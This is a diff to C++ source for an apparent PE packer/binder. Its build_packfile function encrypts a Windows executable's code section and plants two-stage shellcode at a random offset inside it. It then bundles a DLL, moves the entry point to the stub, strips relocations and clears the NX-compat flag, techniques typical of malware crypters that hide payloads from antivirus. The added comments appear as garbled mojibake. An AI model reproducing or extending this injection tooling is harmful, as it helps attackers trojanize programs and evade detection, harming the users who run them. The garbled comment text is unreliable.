@@ -73,7 +73,18 @@ void copy_option_headers(pe_base* source, pe_base* dest)
     get_nt_headers_32_ptr(dest).OptionalHeader.MinorSubsystemVersion
         = get_nt_headers_32_ptr(source).OptionalHeader.MinorSubsystemVersion;
 }
-
+/**
+ * @brief ¹¹½¨´ò°üÎÄ¼ş
+ * 
+ * @param target_file_path Ä¿±êÎÄ¼şÂ·¾¶
+ * @param dll_path DLLÎÄ¼şÂ·¾¶
+ * @param output_file_path Êä³öÎÄ¼şÂ·¾¶
+ * @param stage_1_payload µÚÒ»½×¶ÎÓĞĞ§ÔØºÉ
+ * @param stage_2_payload µÚ¶ş½×¶ÎÓĞĞ§ÔØºÉ
+ * @param config ÅäÖÃÎÄ¼şÂ·¾¶
+ * @return true ¹¹½¨³É¹¦
+ * @return false ¹¹½¨Ê§°Ü
+ */
 bool build_packfile(const std::string& target_file_path, 
     const std::string& dll_path, 
     const std::string& output_file_path,
@@ -81,18 +92,23 @@ bool build_packfile(const std::string& target_file_path,
     const std::string& stage_2_payload,
     const std::string& config)
 {
+    // ´ò¿ªÄ¿±êPEÎÄ¼ş
     std::ifstream pe_file(target_file_path, std::ios::in | std::ios::binary);
     if (!pe_file)
     {
         return false;
     }
+    // ´´½¨PEÎÄ¼ş¶ÔÏó
     pe_base image(pe_factory::create_pe(pe_file));
+    // ¼ì²éPEÎÄ¼şÀàĞÍÊÇ·ñÎª32Î»
     if (image.get_pe_type() == pe_type_64)
     {
         return false;
     }
+    // ´´½¨ĞÂµÄPEÎÄ¼ş¶ÔÏó
     pe_base new_image(pe_properties_32(), image.get_section_alignment());
 
+    // ÉèÖÃPEÎÄ¼şµÄÌØÕ÷ºÍÊôĞÔ
     new_image.set_characteristics(image.get_characteristics());
     new_image.set_dll_characteristics(image.get_dll_characteristics());
     new_image.set_file_alignment(image.get_file_alignment());
@@ -106,6 +122,7 @@ bool build_packfile(const std::string& target_file_path,
     new_image.set_subsystem(image.get_subsystem());
     new_image.set_time_date_stamp(image.get_time_date_stamp());
 
+    // ¸´ÖÆ¿ÉÑ¡Í·ĞÅÏ¢
     copy_option_headers(&image, &new_image);
 
     for (unsigned long i = 0; i < image.get_number_of_rvas_and_sizes(); ++i)
@@ -122,6 +139,7 @@ bool build_packfile(const std::string& target_file_path,
         }
     }
 
+    // ¸´ÖÆ½ÚĞÅÏ¢
     {
         const section_list& pe_sections = image.get_image_sections();
         for (section_list::const_iterator it = pe_sections.begin(); it != pe_sections.end(); ++it)
@@ -138,39 +156,45 @@ bool build_packfile(const std::string& target_file_path,
         }
     }
 
-
+    // ÉèÖÃËæ»úÖÖ×Ó
     srand(::GetTickCount());
+    // ´´½¨¼ÓÃÜ´úÂë½Ú
     section crypt_code_section;
     crypt_code_section.get_raw_data().resize(1);
     crypt_code_section.set_name(".mapo");
     crypt_code_section.readable(true);
 
+    // ¹²ÏíÊı¾İ½á¹¹
     share_data_t share = { kShareDateMagicKey,
     { 0xE8, 0, 0, 0, 0 },
     0xE8, 
+     // ¼õÈ¥ret_opcodeµÄ´óĞ¡,Ò²¾ÍÊÇstage_1_payloadµÄµØÖ·,Ò²¾ÍÊÇcall _loader_entryº¯Êı
     sizeof(share_data_t) - offsetof(share_data_t, ret_opcode),
     0xC3 };
 
     share.stage = 0;
-    //shellcodeåˆå§‹åŒ–åŠå¡«å……
+    // ³õÊ¼»¯²¢Ìî³äshellcode
     std::string shellcode;
     shellcode.resize(sizeof(share) + stage_1_payload.size() + stage_2_payload.size());
     share.oep = image.get_ep();
     share.xor_key = rand();
     share.origin_image_base = image.get_image_base_64();
     memset(share.cfg, 0, sizeof(share.cfg));
+    // ¼ÓÔØÅäÖÃÎÄ¼ş
     ProtocolCFGLoader cfg;
     auto json_str = Packer::load_file(config);
     cfg.json = json::parse(json_str);
     auto cfg_bin = cfg.dump();
     share.cfg_size = cfg_bin.size();
+    // ¼ì²éÅäÖÃÎÄ¼ş´óĞ¡ÊÇ·ñ³¬¹ıÏŞÖÆ
     if(cfg_bin.size() > sizeof(share.cfg))
     {
         std::cerr << "cfg too big" << std::endl;
         return false;
     }
+    // ¸´ÖÆÅäÖÃÎÄ¼şÊı¾İµ½¹²ÏíÊı¾İ½á¹¹
     memcpy(share.cfg, cfg_bin.data(), (std::min)(cfg_bin.size(), sizeof(share.cfg)));
-    /* é‡å®šä½ä¿¡æ¯è®°è½½ */
+    // ÖØ¶¨Î»ĞÅÏ¢¼ÇÔØ
     relocation_table_list relocs_tables(get_relocations(image));
     std::map<uint32_t, relocation_table> new_relocs_tables;
     std::vector<reloc_info_t> relocs;
@@ -201,16 +225,16 @@ bool build_packfile(const std::string& target_file_path,
     {
         relocs_tables.push_back(new_relocs_tables_itor.second);
     }
-    // é‡å®šä½è¡¨
+    // ´´½¨ÖØ¶¨Î»½Ú
     section new_relocs;
     new_relocs.get_raw_data().resize(1);
     new_relocs.set_name(".reloc");
     new_relocs.readable(true);
     section& attached_section = new_image.add_section(new_relocs);
     rebuild_relocations(new_image, relocs_tables, attached_section);
+    // ´´½¨×ÊÔ´½Ú
     resource_directory root(get_resources(image));
     section rsrc;
-    // èµ„æºè¡¨
     rsrc.set_name(".rsrc");
     rsrc.get_raw_data().resize(1);
     rsrc.readable(true);
@@ -218,6 +242,7 @@ bool build_packfile(const std::string& target_file_path,
     section& attach_rsrc = new_image.add_section(rsrc);
     rebuild_resources(new_image, root, attach_rsrc);
 
+    // ¼ÓÔØDLLÎÄ¼ş
     std::ifstream dll_file(dll_path, std::ios::in | std::ios::binary);
     dll_file.seekg(0, dll_file.end);
     const size_t bind_dll_size = dll_file.tellg();
@@ -239,9 +264,7 @@ bool build_packfile(const std::string& target_file_path,
         n++;
     }
     const size_t text_code_offset = offsetof(crypt_code_t, reloc) + relocs.size() * sizeof(reloc_info_t);
-    memcpy(crypt_code.get() + text_code_offset,
-        code_section.get_raw_data().data(),
-        text_code_size);
+	memcpy(crypt_code.get() + text_code_offset, code_section.get_raw_data().data(), text_code_size);
 
     if (bind_dll_size)
     {
@@ -255,25 +278,52 @@ bool build_packfile(const std::string& target_file_path,
     share.crypt_code_rva = bind_crypt_code_section.get_virtual_address();
     share.crypt_code_size = bind_crypt_code_section.get_raw_data().size();
 
+    /*
+    ÕâĞĞC++´úÂëÖ´ĞĞÁËÒ»¸öÌØ¶¨µÄ¼ÆËã£¬ÓÃÓÚÉú³ÉÒ»¸öÃûÎª `random` µÄÕûĞÍ±äÁ¿Öµ¡£Õâ¸öÖµ»ùÓÚÁ½¸ö²»Í¬Êı¾İ´óĞ¡µÄ¼ÆËã£º`shellcode.size()` ºÍ 
+    `code_section.get_raw_data().size()`¡£ÏÂÃæÊÇ¶ÔÕâĞĞ´úÂëµÄÏêÏ¸½âÊÍ£º
+
+    1. **`shellcode.size()`**:
+       - Õâ²¿·Öµ÷ÓÃÁË `shellcode` ¶ÔÏóµÄ `size()` ³ÉÔ±º¯Êı¡£`shellcode` ºÜ¿ÉÄÜÊÇÒ»¸ö´æ´¢ÁËÄ³ÖÖÊı¾İ£¨±ÈÈçshellcode£¬¼´Ò»¶ÎÓÃÓÚÔÚÄ¿±êÏµÍ³
+       ÉÏÖ´ĞĞÌØ¶¨ÈÎÎñµÄ»úÆ÷Âë£©µÄÈİÆ÷£¨Èç `std::vector`¡¢`std::string` µÈ£©¡£`size()` º¯Êı·µ»ØÈİÆ÷ÖĞÔªËØµÄÊıÁ¿£¬¶ÔÓÚ `std::string` »ò×Ö
+       ½ÚÊı×éÀ´Ëµ£¬ÕâÍ¨³£ÒâÎ¶×ÅÊı¾İµÄ×Ö½ÚÊı¡£
+
+    2. **`code_section.get_raw_data().size()`**:
+       - ÕâÀï£¬`code_section` ËÆºõÊÇÒ»¸ö¶ÔÏó£¬ËüÓĞÒ»¸ö³ÉÔ±º¯Êı `get_raw_data()`¡£Õâ¸öº¯Êı·µ»ØÒ»¸öÈİÆ÷»òÀàËÆµÄÊı¾İ½á¹¹£¬¸Ã½á¹¹°üº¬ÁË
+       `code_section` µÄÔ­Ê¼Êı¾İ¡£È»ºó£¬¶ÔÕâ¸ö·µ»ØµÄÊı¾İ½á¹¹µ÷ÓÃÁË `size()` º¯Êı£¬ÒÔ»ñÈ¡Æä´óĞ¡£¨¼´ÔªËØµÄÊıÁ¿»ò×Ö½ÚÊı£©¡£
+
+    3. **`(rand() % (code_section.get_raw_data().size() - shellcode.size()))`**:
+       - `rand()` ÊÇÒ»¸ö±ê×¼¿âº¯Êı£¬ÓÃÓÚÉú³ÉÒ»¸öÎ±Ëæ»úÊı¡£Õâ¸öËæ»úÊıÍ¨³£ÊÇÒ»¸öÏà¶Ô½Ï´óµÄÕûÊı¡£
+       - `%` ÊÇÈ¡Ä£ÔËËã·û£¬ÓÃÓÚ¼ÆËã×ó²àÊı³ıÒÔÓÒ²àÊıµÄÓàÊı¡£ÔÚÕâÀï£¬ËüÓÃÓÚÉú³ÉÒ»¸öÔÚ `0` µ½
+       `(code_section.get_raw_data().size() - shellcode.size() - 1)` ·¶Î§ÄÚµÄËæ»úÕûÊı¡£ÕâÒâÎ¶×Å£¬Èç¹û `code_section` µÄÊı¾İ´óĞ¡Ô¶´óÓÚ
+       `shellcode` µÄ´óĞ¡£¬Õâ¸ö±í´ïÊ½½«Éú³ÉÒ»¸öÏà¶Ô½ÏĞ¡µÄËæ»úÊı¡£
+
+    4. **`shellcode.size() + ...`**:
+       - ×îºó£¬½« `shellcode.size()` µÄÖµÓëÉÏÊöËæ»úÊıÏà¼Ó¡£ÕâÑù£¬`random` µÄÖµ½«ÊÇÒ»¸öÖÁÉÙµÈÓÚ `shellcode.size()` µÄÊı£¬ÇÒ×î´ó²»³¬¹ı
+       `code_section.get_raw_data().size()`£¨Èç¹û `shellcode.size()` ²»ÎªÁã£©¡£
+
+    **Ä¿µÄºÍÓÃÍ¾**£º
+
+    ÕâĞĞ´úÂëµÄÄ¿µÄ¿ÉÄÜÊÇÎªÁËÔÚÒ»¸ö¸ü´óµÄÊı¾İ¿é£¨`code_section.get_raw_data()`£©ÖĞ£¬»ùÓÚ `shellcode` µÄ´óĞ¡£¬Ëæ»úÑ¡ÔñÒ»¸öÆğÊ¼Î»ÖÃÀ´²åÈë
+    »ò²Ù×÷ `shellcode`¡£Í¨¹ıÈ·±£ `random` µÄÖµÖÁÉÙµÈÓÚ `shellcode.size()`£¬´úÂë¿ÉÄÜÖ¼ÔÚ±ÜÃâÔÚÑ¡ÔñµÄÎ»ÖÃÃ»ÓĞ×ã¹»µÄ¿Õ¼äÀ´ÈİÄÉ `shellcode`¡£
+    È»¶ø£¬ÕâÖÖ¼ÆËã·½Ê½Ò²¼ÙÉè `code_section.get_raw_data().size()` ´óÓÚ»òµÈÓÚ `2 * shellcode.size()`£¨ÎªÁË´¦Àí `rand()` ¿ÉÄÜ²úÉúµÄÁãÖµÇé
+    ¿ö£¬¾¡¹ÜÓÉÓÚÈ¡Ä£ÔËËã£¬ÁãÖµÊµ¼ÊÉÏ²»»áÖ±½Ó²úÉú£¬µ«½Ó½üÁãµÄĞ¡ÖµÈÔ¿ÉÄÜµ¼ÖÂ¿Õ¼ä²»×ãµÄÎÊÌâ£¬³ı·ÇÓĞ¶îÍâµÄ¼ì²é£©¡£
+
+    */
     int random = shellcode.size() + (rand() % (code_section.get_raw_data().size() - shellcode.size()));
 
     share.stub_rva = random;
     share.stub_size = shellcode.size();
     share.stub_entry_rva = sizeof(share_data_t) + stage_1_payload.size();
 
-    memcpy((void*)shellcode.data(),
-        &share,
-        sizeof(share));
-    memcpy((unsigned char*)shellcode.data() + sizeof(share),
-        stage_1_payload.data(),
-        stage_1_payload.size());
-    memcpy((unsigned char*)shellcode.data() + sizeof(share) + stage_1_payload.size(),
-        stage_2_payload.data(),
-        stage_2_payload.size());
+    // shellcode.data() = share + stage_1_payload + stage_2_payload;
+	memcpy((void*)shellcode.data(), &share, sizeof(share));
+	memcpy((unsigned char*)shellcode.data() + sizeof(share), stage_1_payload.data(), stage_1_payload.size());
+	memcpy((unsigned char*)shellcode.data() + sizeof(share) + stage_1_payload.size(), stage_2_payload.data(), stage_2_payload.size());
 
-    //æ¸…ç©ºä»£ç æ®µ
+    //Çå¿Õ´úÂë¶Î
     //memset((void*)new_image.get_image_sections().front().get_raw_data().data(), 0xCC, code_section.get_raw_data().size());
 
+    // ÑéÖ¤µ¼Èë±íÔÚimageµÄÓĞĞ§½ÚÇøÄÚ£¬²¢½«imageÖĞµÄµ¼Èë±íÊı¾İ¸´ÖÆµ½new_imageÖĞµÄ¶ÔÓ¦Î»ÖÃ¡£
     if (image.get_image_sections().front().get_virtual_address() <= image.get_directory_rva(pe_win::image_directory_entry_import)
         && image.get_directory_rva(pe_win::image_directory_entry_import) <= image.get_image_sections().front().get_virtual_size())
     {
@@ -284,14 +334,12 @@ bool build_packfile(const std::string& target_file_path,
             text.get_raw_data().size() - (image.get_directory_rva(pe_win::image_directory_entry_import) - text.get_virtual_address()));
     }
 
-    //å†™å…¥ç›®æ ‡æ–‡ä»¶ä»£ç æ®µ
-    memcpy((void*)(new_image.get_image_sections().front().get_raw_data().data() + random),
-        shellcode.data(),
-        shellcode.size());
-    
+	//Ğ´ÈëÄ¿±êÎÄ¼ş´úÂë¶Î
+	memcpy((void*)(new_image.get_image_sections().front().get_raw_data().data() + random), shellcode.data(), shellcode.size());
+
     new_image.set_ep(new_image.get_image_sections().front().get_virtual_address() + random + offsetof(share_data_t, eip_opcode));
 
-    //å…³é—­é‡å®šä½
+    //¹Ø±ÕÖØ¶¨Î»
     new_image.set_characteristics_flags(pe_bliss::pe_win::image_file_relocs_stripped);
     new_image.clear_characteristics_flags(pe_bliss::pe_win::image_dllcharacteristics_nx_compat);
 
@@ -299,11 +347,10 @@ bool build_packfile(const std::string& target_file_path,
     rebuild_pe(new_image, temp_pe);
     //new_image->set_checksum(calculate_checksum(temp_pe));
 
-    std::ofstream new_pe_file(output_file_path.c_str(),
-        std::ios::out | std::ios::binary | std::ios::trunc);
+    std::ofstream new_pe_file(output_file_path.c_str(), std::ios::out | std::ios::binary | std::ios::trunc);
     if (new_pe_file.is_open() == false)
     {
-        std::cerr << "æ–‡ä»¶å ç”¨" << std::endl;
+        std::cerr << "ÎÄ¼şÕ¼ÓÃ" << std::endl;
         return false;
     }
         
